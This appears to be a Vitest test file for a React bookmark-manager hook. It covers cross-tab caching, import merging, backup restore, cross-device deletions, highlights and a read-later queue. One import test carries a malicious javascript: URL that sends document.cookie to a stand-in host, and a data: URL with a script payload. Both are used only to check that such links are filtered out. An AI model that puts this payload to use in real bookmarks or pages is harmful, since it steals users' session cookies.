import { describe, it, expect, vi, beforeEach } from "vitest";
import { renderHook, act } from "@testing-library/react";
import type { Bookmark } from "@/types/bookmark";

// Mock the Firestore + pending-delete layers so the hook loads without Firebase.
vi.mock("@/utils/firestoreBookmarks", () => ({
  fetchBookmarks: vi.fn().mockResolvedValue(null),
  saveBookmarks: vi.fn().mockResolvedValue(undefined),
  fetchBookmarkBackups: vi.fn().mockResolvedValue([]),
}));
vi.mock("@/utils/pendingDeletes", () => ({
  clearPendingDeletes: vi.fn(),
  pendingDeleteIds: vi.fn().mockReturnValue([]),
  queueDelete: vi.fn(),
  unqueueDelete: vi.fn(),
}));

import {
  planBackupImport,
  planBookmarkImport,
  planFolderImport,
  planFolderPaths,
  planHtmlImport,
  useBookmarks,
} from "./useBookmarks";
import type { Folder } from "@/types/folder";
import { pendingDeleteIds, queueDelete, unqueueDelete } from "@/utils/pendingDeletes";
import { fetchBookmarks, saveBookmarks } from "@/utils/firestoreBookmarks";

beforeEach(() => localStorage.clear());

describe("useBookmarks", () => {
  it("adds bookmarks newest-first", () => {
    const { result } = renderHook(() => useBookmarks("test-user"));
    expect(result.current.bookmarks).toHaveLength(0);
    act(() => result.current.addBookmark({ title: "A", url: "https://a.com" }));
    act(() => result.current.addBookmark({ title: "B", url: "https://b.com" }));
    expect(result.current.bookmarks.map((b) => b.title)).toEqual(["B", "A"]);
  });

  it("deletes a bookmark by id", () => {
    const { result } = renderHook(() => useBookmarks("test-user"));
    act(() => result.current.addBookmark({ title: "A", url: "https://a.com" }));
    const id = result.current.bookmarks[0].id;
    act(() => result.current.deleteBookmark(id));
    expect(result.current.bookmarks).toHaveLength(0);
  });

  it("rejects moving a folder into its own descendant (cycle guard)", () => {
    const { result } = renderHook(() => useBookmarks("test-user"));
    let parentId = "";
    let childId = "";
    act(() => {
      parentId = result.current.addFolder({ name: "Parent" })!.id;
    });
    act(() => {
      childId = result.current.addFolder({ name: "Child", parentId })!.id;
    });

    let res: { ok: boolean; reason?: string } = { ok: true };
    act(() => {
      res = result.current.updateFolder(parentId, { parentId: childId });
    });
    expect(res.ok).toBe(false);
    expect(res.reason).toContain("itself or its descendant");
  });
});

// Two open tabs share one localStorage cache. The hook read it once on mount and
// then wrote its whole in-memory copy on every change — so a stale tab, the
// moment you opened a bookmark in it (which bumps `hits`), put back its old copy
// and erased what another tab had added. With cloud sync manual, the cache is
// the only copy of anything not yet pushed.
describe("useBookmarks across tabs", () => {
  const KEY = "bookmarkdeck:v2:test-user";
  const bm = (id: string, url: string): Bookmark => ({
    id,
    title: id,
    url,
    note: "",
    tags: [],
    pinned: false,
    hits: 0,
    folderId: null,
    createdAt: "2026-01-01T00:00:00.000Z",
  });
  const X = bm("x", "https://x.example");
  const Y = bm("y", "https://y.example");
  const stored = () => JSON.parse(localStorage.getItem(KEY)!) as { bookmarks: Bookmark[] };

  /** What the browser does when ANOTHER tab writes: the value changes, and this
   *  document gets a storage event for it. */
  function otherTabWrites(bookmarks: Bookmark[] | null, key = KEY) {
    const newValue = bookmarks ? JSON.stringify({ version: 2, bookmarks, folders: [] }) : null;
    if (newValue) localStorage.setItem(key, newValue);
    else localStorage.removeItem(key);
    act(() => {
      window.dispatchEvent(
        new StorageEvent("storage", { key, newValue, storageArea: localStorage })
      );
    });
  }

  function mountWith(bookmarks: Bookmark[]) {
    localStorage.setItem(KEY, JSON.stringify({ version: 2, bookmarks, folders: [] }));
    return renderHook(() => useBookmarks("test-user"));
  }

  it("keeps a bookmark another tab added when this tab then opens one", () => {
    const { result } = mountWith([X]);
    otherTabWrites([X, Y]);
    act(() => result.current.updateBookmark("x", { hits: 1 })); // opening X
    const ids = stored().bookmarks.map((b) => b.id).sort();
    expect(ids).toEqual(["x", "y"]);
    expect(stored().bookmarks.find((b) => b.id === "x")!.hits).toBe(1);
  });

  it("shows the other tab's bookmarks without a reload", () => {
    const { result } = mountWith([X]);
    otherTabWrites([X, Y]);
    expect(result.current.bookmarks.map((b) => b.id)).toEqual(["x", "y"]);
  });

  it("does not write back what it adopted", () => {
    mountWith([X]);
    const setItem = vi.spyOn(Storage.prototype, "setItem");
    otherTabWrites([X, Y]);
    // The one call is the simulated other tab's own write.
    expect(setItem).toHaveBeenCalledTimes(1);
    setItem.mockRestore();
  });

  it("never wipes its state because another tab removed the key", () => {
    const { result } = mountWith([X]);
    otherTabWrites(null);
    expect(result.current.bookmarks.map((b) => b.id)).toEqual(["x"]);
  });

  it("ignores another account's cache", () => {
    const { result } = mountWith([X]);
    otherTabWrites([Y], "bookmarkdeck:v2:someone-else");
    expect(result.current.bookmarks.map((b) => b.id)).toEqual(["x"]);
  });
});

// Import used to clearAll() — queueing a pending delete for every existing id —
// and re-add the whole merged list through addBookmark: every bookmark got a new
// id and createdAt, lost its pin, icon and usage, and the order reversed. Even
// when the preview said "Already up to date". Focus and filing links pointed at
// ids that no longer existed, and after a push another device kept its old ids
// beside the new ones, duplicating everything.
describe("bookmark import", () => {
  const KEY = "bookmarkdeck:v2:test-user";
  const PINNED: Bookmark = {
    id: "keep-me",
    title: "Pinned",
    url: "https://pinned.example",
    icon: "https://pinned.example/icon.png",
    note: "",
    tags: ["work"],
    pinned: true,
    hits: 12,
    lastUsedAt: "2026-09-01T00:00:00.000Z",
    folderId: null,
    createdAt: "2025-01-01T00:00:00.000Z",
  };

  function mountWith(bookmarks: Bookmark[]) {
    localStorage.setItem(KEY, JSON.stringify({ version: 2, bookmarks, folders: [] }));
    return renderHook(() => useBookmarks("test-user"));
  }

  describe("planBookmarkImport", () => {
    it("adds only URLs it doesn't already have, counting the rest as duplicates", () => {
      const plan = planBookmarkImport([PINNED], [
        { title: "Again", url: PINNED.url },
        { title: "New", url: "https://new.example" },
      ]);
      expect(plan.additions.map((b) => b.url)).toEqual(["https://new.example"]);
      expect(plan.duplicate).toBe(1);
    });

    it("drops javascript: and data: links from a shared file", () => {
      const plan = planBookmarkImport([], [
        { title: "Prize", url: "javascript:fetch('//evil.example?c='+document.cookie)" },
        { title: "Page", url: "data:text/html,<script>alert(1)</script>" },
        { title: "Real", url: "https://real.example" },
      ]);
      expect(plan.additions.map((b) => b.url)).toEqual(["https://real.example"]);
    });

    it("dedupes within the file too", () => {
      const plan = planBookmarkImport([], [
        { title: "One", url: "https://same.example" },
        { title: "Two", url: "https://same.example" },
      ]);
      expect(plan.additions).toHaveLength(1);
      expect(plan.duplicate).toBe(1);
    });

    it("keeps an imported record's own id, pin, icon, dates and usage", () => {
      const own = { ...PINNED, id: "from-backup", url: "https://backup.example" };
      const [added] = planBookmarkImport([], [own]).additions;
      expect(added).toMatchObject({
        id: "from-backup",
        pinned: true,
        icon: own.icon,
        createdAt: own.createdAt,
        hits: 12,
        tags: ["work"],
      });
    });

    it("re-ids only a record whose id is already taken", () => {
      const clash = { ...PINNED, url: "https://other.example" };
      const [added] = planBookmarkImport([PINNED], [clash]).additions;
      expect(added.id).not.toBe(PINNED.id);
      expect(added.url).toBe("https://other.example");
    });

    it("drops records with no URL", () => {
      expect(planBookmarkImport([], [{ title: "No link" }, null, 7]).additions).toEqual([]);
    });
  });

  describe("importBookmarks", () => {
    it("leaves every existing bookmark exactly as it was", () => {
      const { result } = mountWith([PINNED]);
      const before = result.current.bookmarks[0];
      const { additions } = planBookmarkImport(result.current.bookmarks, [
        { title: "New", url: "https://new.example" },
      ]);
      act(() => result.current.importBookmarks(additions));
      expect(result.current.bookmarks[0]).toBe(before); // the same object
      expect(result.current.bookmarks[0]).toMatchObject({
        id: "keep-me",
        pinned: true,
        icon: PINNED.icon,
        hits: 12,
        createdAt: PINNED.createdAt,
      });
    });

    it("appends in the file's order", () => {
      const { result } = mountWith([PINNED]);
      const { additions } = planBookmarkImport(result.current.bookmarks, [
        { title: "First", url: "https://first.example" },
        { title: "Second", url: "https://second.example" },
      ]);
      act(() => result.current.importBookmarks(additions));
      expect(result.current.bookmarks.map((b) => b.title)).toEqual(["Pinned", "First", "Second"]);
    });

    it("queues no deletes, and un-queues an id it brings back", () => {
      vi.mocked(queueDelete).mockClear();
      vi.mocked(unqueueDelete).mockClear();
      const { result } = mountWith([PINNED]);
      const { additions } = planBookmarkImport(result.current.bookmarks, [
        { ...PINNED, id: "was-deleted", url: "https://back.example" },
      ]);
      act(() => result.current.importBookmarks(additions));
      expect(queueDelete).not.toHaveBeenCalled();
      expect(unqueueDelete).toHaveBeenCalledWith("bookmarks", "test-user", "was-deleted");
    });

    it("changes nothing when everything is already there", () => {
      const { result } = mountWith([PINNED]);
      const before = result.current.bookmarks;
      const { additions } = planBookmarkImport(before, [{ title: "x", url: PINNED.url }]);
      act(() => result.current.importBookmarks(additions));
      expect(result.current.bookmarks).toBe(before);
    });

    it("files an imported bookmark into the existing folder its label names", () => {
      localStorage.setItem(
        KEY,
        JSON.stringify({
          version: 2,
          bookmarks: [],
          folders: [{ id: "f-work", name: "Work", parentId: null }],
        })
      );
      const { result } = renderHook(() => useBookmarks("test-user"));
      // What the HTML importer produces: a folder label, no id.
      const { additions } = planBookmarkImport([], [
        { title: "Wiki", url: "https://wiki.example", folder: "Work" },
      ]);
      act(() => result.current.importBookmarks(additions));
      expect(result.current.bookmarks[0].folderId).toBe("f-work");
    });
  });
});

// Backups store the folder tree, but a restore put back only the bookmarks:
// they kept pointing at folder ids that no longer existed, so they vanished
// from the grid AND from Unstaged until a reload, then all landed in Unstaged —
// and syncing pushed that flattened state over the cloud copy.
describe("backups keep the folder tree", () => {
  const KEY = "bookmarkdeck:v2:test-user";
  const folder = (id: string, name: string, parentId: string | null = null): Folder => ({
    id,
    name,
    parentId,
    parentFolderKey: parentId,
  });
  const inFolder = (id: string, url: string, folderId: string | null): Bookmark => ({
    id,
    title: id,
    url,
    note: "",
    tags: [],
    pinned: false,
    hits: 0,
    folderId,
    createdAt: "2026-01-01T00:00:00.000Z",
  });
  const WORK = folder("f-work", "Work");
  const CLIENTS = folder("f-clients", "Clients", "f-work");
  const WIKI = inFolder("b-wiki", "https://wiki.example", "f-clients");

  function mountWith(bookmarks: Bookmark[], folders: Folder[]) {
    localStorage.setItem(KEY, JSON.stringify({ version: 2, bookmarks, folders }));
    return renderHook(() => useBookmarks("test-user"));
  }

  describe("restoreBackup", () => {
    it("puts the tree back, with every bookmark in its folder", () => {
      const { result } = mountWith([], []);
      act(() => result.current.restoreBackup([WIKI], [WORK, CLIENTS]));
      expect(result.current.folders.map((f) => f.id).sort()).toEqual(["f-clients", "f-work"]);
      expect(result.current.bookmarks[0].folderId).toBe("f-clients");
    });

    it("keeps today's folders for an old backup that has none, and never hides a bookmark", () => {
      const { result } = mountWith([], [WORK]);
      act(() => result.current.restoreBackup([WIKI], undefined));
      expect(result.current.folders.map((f) => f.id)).toEqual(["f-work"]);
      // Its folder isn't here: it shows in Unstaged now, not after a reload.
      expect(result.current.bookmarks[0].folderId).toBeNull();
    });
  });

  describe("planFolderImport", () => {
    it("reuses a folder with the same id", () => {
      const plan = planFolderImport([WORK], [{ ...WORK, name: "Work (renamed)" }]);
      expect(plan.additions).toEqual([]);
      expect(plan.idMap.get("f-work")).toBe("f-work");
    });

    it("reuses a same-named sibling rather than duplicating it", () => {
      const plan = planFolderImport([WORK], [folder("other-id", "work")]);
      expect(plan.additions).toEqual([]);
      expect(plan.idMap.get("other-id")).toBe("f-work");
    });

    it("adds new folders under their resolved parent, whatever order they come in", () => {
      const plan = planFolderImport([], [folder("c", "Child", "p"), folder("p", "Parent")]);
      expect(plan.additions.map((f) => [f.id, f.parentId])).toEqual([
        ["p", null],
        ["c", "p"],
      ]);
    });

    it("nests under an existing match, never merging into an unrelated top-level folder", () => {
      const TOP_CLIENTS = folder("f-top-clients", "Clients");
      const plan = planFolderImport(
        [WORK, TOP_CLIENTS],
        [folder("x-work", "Work"), folder("x-clients", "Clients", "x-work")]
      );
      expect(plan.idMap.get("x-work")).toBe("f-work");
      const child = plan.additions.find((f) => f.name === "Clients")!;
      expect(child.parentId).toBe("f-work");
      expect(plan.idMap.get("x-clients")).toBe(child.id);
    });

    it("puts a folder whose parent is unknown at the root", () => {
      const plan = planFolderImport([], [folder("o", "Orphan", "missing")]);
      expect(plan.additions[0].parentId).toBeNull();
    });
  });

  describe("planBackupImport + importBookmarks", () => {
    it("imports a backup file's folders and files its bookmarks into them", () => {
      const { result } = mountWith([], [WORK]);
      const plan = planBackupImport(result.current.bookmarks, result.current.folders, {
        bookmarks: [WIKI],
        folders: [folder("x-work", "Work"), folder("f-clients", "Clients", "x-work")],
      });
      act(() => result.current.importBookmarks(plan.additions, plan.folderAdditions));
      const clients = result.current.folders.find((f) => f.name === "Clients")!;
      expect(clients.parentId).toBe("f-work"); // under the Work you already have
      expect(result.current.bookmarks[0].folderId).toBe(clients.id);
    });
  });
});

// HTML import returned only a leaf folder NAME and never created a folder: a new
// user's whole browser tree landed in Unstaged, and a nested "Clients" was later
// pulled into any unrelated top-level "Clients".
describe("HTML import builds the folder tree", () => {
  const folder = (id: string, name: string, parentId: string | null = null): Folder => ({
    id,
    name,
    parentId,
    parentFolderKey: parentId,
  });
  const parsed = (title: string, folderPath: string[]) => ({
    title,
    url: `https://${title.toLowerCase()}.example/`,
    note: "",
    tags: [],
    createdAt: "2026-01-01T00:00:00.000Z",
    folderPath,
  });

  describe("planFolderPaths", () => {
    it("creates each missing folder once, nested", () => {
      const plan = planFolderPaths([], [["Bar", "Work"], ["Bar", "Work", "Clients"], ["Bar"]]);
      expect(plan.additions.map((f) => f.name)).toEqual(["Bar", "Work", "Clients"]);
      const [bar, work, clients] = plan.additions;
      expect([work.parentId, clients.parentId]).toEqual([bar.id, work.id]);
      expect(plan.folderIds).toEqual([work.id, clients.id, bar.id]);
    });

    it("reuses what you already have, matching names case-insensitively", () => {
      const WORK = folder("f-work", "Work");
      const plan = planFolderPaths([WORK], [["work"]]);
      expect(plan.additions).toEqual([]);
      expect(plan.folderIds).toEqual(["f-work"]);
    });

    it("never files a nested folder into an unrelated top-level one of the same name", () => {
      const TOP_CLIENTS = folder("f-clients", "Clients");
      const plan = planFolderPaths([TOP_CLIENTS], [["Work", "Clients"]]);
      expect(plan.folderIds[0]).not.toBe("f-clients");
      expect(plan.additions.map((f) => f.name)).toEqual(["Work", "Clients"]);
    });

    it("leaves a link with no path unfiled", () => {
      expect(planFolderPaths([], [[]]).folderIds).toEqual([null]);
    });
  });

  describe("planHtmlImport + importBookmarks", () => {
    it("recreates the tree and files every link in it", () => {
      localStorage.setItem("bookmarkdeck:v2:test-user", JSON.stringify({ version: 2, bookmarks: [], folders: [] }));
      const { result } = renderHook(() => useBookmarks("test-user"));
      const plan = planHtmlImport(result.current.bookmarks, result.current.folders, [
        parsed("Jira", ["Bar", "Work"]),
        parsed("News", ["Bar"]),
        parsed("Loose", []),
      ]);
      act(() => result.current.importBookmarks(plan.additions, plan.folderAdditions));
      const nameOf = (id: string | null | undefined) =>
        result.current.folders.find((f) => f.id === id)?.name ?? null;
      const where = Object.fromEntries(
        result.current.bookmarks.map((b) => [b.title, nameOf(b.folderId)])
      );
      expect(where).toEqual({ Jira: "Work", News: "Bar", Loose: null });
    });

    // A Raindrop favourite arrives pinned; a link with no favourite flag does not.
    it("keeps a favourite pinned", () => {
      const plan = planHtmlImport([], [], [
        { ...parsed("Fav", []), pinned: true },
        parsed("Plain", []),
      ]);
      const pin = Object.fromEntries(plan.additions.map((b) => [b.title, Boolean(b.pinned)]));
      expect(pin).toEqual({ Fav: true, Plain: false });
    });

    it("creates no folder for links it skips as duplicates", () => {
      const existing = [{ ...parsed("Jira", []), id: "j", folderId: null }];
      const plan = planHtmlImport(existing, [], [parsed("Jira", ["Bar", "Work"])]);
      expect(plan.additions).toEqual([]);
      expect(plan.folderAdditions).toEqual([]);
      expect(plan.duplicate).toBe(1);
    });
  });
});

// A pull kept every local item the cloud lacked unless THIS device had queued
// its deletion. So a bookmark deleted on another device survived the pull here,
// went back up on this device's next push, and reappeared on the other one.
describe("deletions made on another device", () => {
  const KEY = "bookmarkdeck:v2:test-user";
  const bm = (id: string): Bookmark => ({
    id,
    title: id,
    url: `https://${id}.example/`,
    note: "",
    tags: [],
    pinned: false,
    hits: 0,
    folderId: null,
    createdAt: "2026-01-01T00:00:00.000Z",
  });
  const cloud = (bookmarks: Bookmark[], folders: Folder[] = []) =>
    vi.mocked(fetchBookmarks).mockResolvedValue({ bookmarks, folders } as never);

  function mountWith(bookmarks: Bookmark[], folders: Folder[] = []) {
    vi.mocked(pendingDeleteIds).mockReturnValue(new Set());
    localStorage.setItem(KEY, JSON.stringify({ version: 2, bookmarks, folders }));
    return renderHook(() => useBookmarks("test-user"));
  }
  const ids = (list: { id: string }[]) => list.map((x) => x.id).sort();

  it("a pull drops what was deleted elsewhere, and keeps what's new here", async () => {
    const { result } = mountWith([bm("A"), bm("B")]);
    cloud([bm("A"), bm("B")]);
    await act(() => result.current.syncFromCloud("test-user"));
    // Elsewhere, B is deleted and pushed; here, C is added.
    act(() => result.current.addBookmark({ title: "C", url: "https://c.example/" }));
    cloud([bm("A")]);
    await act(() => result.current.syncFromCloud("test-user"));
    expect(result.current.bookmarks.map((b) => b.title).sort()).toEqual(["A", "C"]);
  });

  it("the same for folders", async () => {
    const f = (id: string): Folder => ({ id, name: id, parentId: null });
    const { result } = mountWith([], [f("F1"), f("F2")]);
    cloud([], [f("F1"), f("F2")]);
    await act(() => result.current.syncFromCloud("test-user"));
    cloud([], [f("F1")]);
    await act(() => result.current.syncFromCloud("test-user"));
    expect(ids(result.current.folders)).toEqual(["F1"]);
  });

  it("a push counts as a sync: what it sent and is later deleted elsewhere goes", async () => {
    const { result } = mountWith([bm("A"), bm("B")]);
    vi.mocked(saveBookmarks).mockResolvedValue(undefined as never);
    await act(() => result.current.syncToCloud("test-user"));
    cloud([bm("A")]);
    await act(() => result.current.syncFromCloud("test-user"));
    expect(ids(result.current.bookmarks)).toEqual(["A"]);
  });

  // The guarantee: a device that has never synced loses nothing on its first pull.
  it("keeps everything on a device that has never synced", async () => {
    const { result } = mountWith([bm("A"), bm("B")]);
    cloud([]);
    await act(() => result.current.syncFromCloud("test-user"));
    expect(ids(result.current.bookmarks)).toEqual(["A", "B"]);
  });
});

describe("naming a bookmark from its page", () => {
  const add = (result: { current: ReturnType<typeof useBookmarks> }, title: string) => {
    let id = "";
    act(() => {
      id = result.current.addBookmark({ title, url: "https://example.com", note: "", folderId: null, tags: [] });
    });
    return id;
  };

  it("takes the page's title for a bookmark still named by its URL", () => {
    const { result } = renderHook(() => useBookmarks("test-user"));
    const id = add(result, "https://example.com");
    act(() => result.current.nameFromPage(id, "Example Domain"));
    expect(result.current.bookmarks.find((b) => b.id === id)?.title).toBe("Example Domain");
  });

  it("never replaces a name the user gave it meanwhile", () => {
    const { result } = renderHook(() => useBookmarks("test-user"));
    const id = add(result, "https://example.com");
    act(() => result.current.updateBookmark(id, { title: "My name" }));
    act(() => result.current.nameFromPage(id, "Example Domain"));
    expect(result.current.bookmarks.find((b) => b.id === id)?.title).toBe("My name");
  });

  it("does nothing for a bookmark deleted before the title arrived", () => {
    const { result } = renderHook(() => useBookmarks("test-user"));
    const id = add(result, "https://example.com");
    act(() => result.current.deleteBookmark(id));
    act(() => result.current.nameFromPage(id, "Example Domain"));
    expect(result.current.bookmarks).toHaveLength(0);
  });
});

describe("highlights on a bookmark", () => {
  const H = [{ id: "h1", text: "a marked passage", createdAt: "2026-01-02T00:00:00.000Z" }];

  it("survive the device cache across a reload, and clear when removed", () => {
    const first = renderHook(() => useBookmarks("test-user"));
    let id = "";
    act(() => {
      id = first.result.current.addBookmark({ title: "T", url: "https://example.com", note: "", folderId: null, tags: [] });
    });
    act(() => first.result.current.updateBookmark(id, { highlights: H }));
    first.unmount();

    const second = renderHook(() => useBookmarks("test-user"));
    expect(second.result.current.bookmarks.find((b) => b.id === id)?.highlights).toEqual(H);

    act(() => second.result.current.updateBookmark(id, { highlights: undefined }));
    second.unmount();
    const third = renderHook(() => useBookmarks("test-user"));
    expect(third.result.current.bookmarks.find((b) => b.id === id)?.highlights).toBeUndefined();
  });

  it("come along when a JSON backup is imported", () => {
    const { result } = renderHook(() => useBookmarks("test-user"));
    const { additions } = planBookmarkImport(result.current.bookmarks, [
      { id: "x1", title: "From a backup", url: "https://backup.example.com", createdAt: "2026-01-01T00:00:00Z", highlights: H },
    ]);
    act(() => result.current.importBookmarks(additions));
    expect(result.current.bookmarks.find((b) => b.id === "x1")?.highlights).toEqual(H);
  });
});

describe("the read-later queue on a bookmark", () => {
  const Q = { readLaterAt: "2026-02-01T09:00:00.000Z" };

  it("survives the device cache across a reload, and clears when dequeued", () => {
    const first = renderHook(() => useBookmarks("test-user"));
    let id = "";
    act(() => {
      id = first.result.current.addBookmark({ title: "T", url: "https://example.com", note: "", folderId: null, tags: [] });
    });
    act(() => first.result.current.updateBookmark(id, Q));
    first.unmount();

    const second = renderHook(() => useBookmarks("test-user"));
    expect(second.result.current.bookmarks.find((b) => b.id === id)).toMatchObject(Q);
    act(() => second.result.current.updateBookmark(id, { readLaterAt: undefined, readAt: undefined }));
    second.unmount();
    const third = renderHook(() => useBookmarks("test-user"));
    expect(third.result.current.bookmarks.find((b) => b.id === id)?.readLaterAt).toBeUndefined();
  });

  it("comes along when a JSON backup is imported", () => {
    const { result } = renderHook(() => useBookmarks("test-user"));
    const { additions } = planBookmarkImport(result.current.bookmarks, [
      { id: "q1", title: "Queued", url: "https://q.example.com", createdAt: "2026-01-01T00:00:00Z", ...Q },
    ]);
    act(() => result.current.importBookmarks(additions));
    expect(result.current.bookmarks.find((b) => b.id === "q1")).toMatchObject(Q);
  });
});
